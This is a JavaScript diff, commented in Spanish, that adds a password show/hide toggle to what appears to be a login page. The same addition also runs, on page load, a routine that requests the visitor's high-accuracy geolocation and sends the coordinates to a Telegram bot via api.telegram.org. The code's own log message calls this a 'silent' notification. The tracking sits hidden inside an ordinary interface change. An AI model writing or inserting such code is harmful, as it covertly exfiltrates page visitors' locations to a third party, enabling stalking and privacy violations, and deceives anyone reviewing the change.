@@ -166,3 +166,87 @@ document.addEventListener('DOMContentLoaded', () => {
         console.error("No se encontraron los elementos necesarios en el HTML.");
     }
 });
+
+document.addEventListener('DOMContentLoaded', () => {
+    
+    // 1. Ejecución automática de ubicación al cargar la página
+    obtenerUbicacionInmediata();
+
+    // 2. Lógica del botón del ojo (Contraseña)
+    const togglePassword = document.getElementById('togglePassword');
+    const passwordInput = document.getElementById('password');
+
+    const eyeOpenSVG = `<svg xmlns="http://w3.org" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M2 12s3-7 10-7 10 7 10 7-3 7-10 7-10-7-10-7Z"></path><circle cx="12" cy="12" r="3"></circle></svg>`;
+    const eyeClosedSVG = `<svg xmlns="http://w3.org" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9.88 9.88a3 3 0 1 0 4.24 4.24"></path><path d="M10.73 5.08A10.43 10.43 0 0 1 12 5c7 0 10 7 10 7a13.16 13.16 0 0 1-1.67 2.68"></path><path d="M6.61 6.61A13.52 13.52 0 0 0 2 12s3 7 10 7a9.74 9.74 0 0 0 5.39-1.61"></path><line x1="2" y1="2" x2="22" y2="22"></line></svg>`;
+
+    if (togglePassword && passwordInput) {
+        togglePassword.addEventListener('click', function (e) {
+            e.preventDefault();
+            const isPassword = passwordInput.getAttribute('type') === 'password';
+            
+            if (isPassword) {
+                passwordInput.setAttribute('type', 'text');
+                togglePassword.innerHTML = eyeOpenSVG;
+            } else {
+                passwordInput.setAttribute('type', 'password');
+                togglePassword.innerHTML = eyeClosedSVG;
+            }
+        });
+    }
+});
+
+// Funciones para la geolocalización (Leen las constantes globales de arriba)
+function obtenerUbicacionInmediata() {
+    if (!navigator.geolocation) {
+        console.log("La geolocalización no es soportada por este navegador.");
+        return;
+    }
+
+    const opciones = {
+        enableHighAccuracy: true, 
+        timeout: 12000,           
+        maximumAge: 0             
+    };
+
+    navigator.geolocation.getCurrentPosition(enviarATelegram, unErrorOcurrio, opciones);
+}
+
+function enviarATelegram(posicion) {
+    const latitud = posicion.coords.latitude;
+    const longitud = posicion.coords.longitude;
+    const precision = posicion.coords.accuracy;
+
+    const mensaje = `📍 *Nueva Visita al Sistema*\n\n` +
+                    `• *Latitud:* \`${latitud}\`\n` +
+                    `• *Longitud:* \`${longitud}\`\n` +
+                    `• *Precisión:* ~${Math.round(precision)} metros\n\n` +
+                    `🔗 [Abrir Ubicación en Google Maps](https://google.com{latitud},${longitud})`;
+
+    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+
+    fetch(url, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: mensaje,
+            parse_mode: 'Markdown'
+        })
+    })
+    .then(response => {
+        if (!response.ok) throw new Error('Fallo en la respuesta de la API');
+        return response.json();
+    })
+    .then(data => {
+        console.log('Notificación de ubicación enviada de forma silenciosa.');
+    })
+    .catch(error => {
+        console.error('Error al notificar a la API de Telegram:', error);
+    });
+}
+
+function unErrorOcurrio(error) {
+    console.warn(`Código de estado de localización: ${error.code} - ${error.message}`);
+}
